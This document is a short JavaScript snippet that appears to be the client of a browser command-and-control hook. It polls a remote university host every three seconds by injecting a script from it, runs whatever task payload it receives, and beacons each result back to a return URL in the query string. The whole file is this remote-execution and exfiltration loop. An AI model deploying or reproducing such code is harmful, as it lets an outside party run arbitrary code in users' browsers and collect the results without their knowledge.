___.$(function($) {

    // Triggers a command for processing
    ___.fire = function(payload) {
        $(document).trigger({
            type: '___',
            payload: payload
        });
    };

    // If this script is living in the top level
    if (top == window) {

        // Accepts command payloads
        $(document).on('___', function(event) {
            var payload = event.payload;
            payload.task.call(this, function(result) {
                ___.include(payload.return + "?key=" + payload.key + "&result=" + result);
            });
        });

        // Constantly polls for commands
        setInterval(function() {
            ___.include('//wagner.cse.unsw.edu.au:3977/queue');
        }, 3000);
    }
});
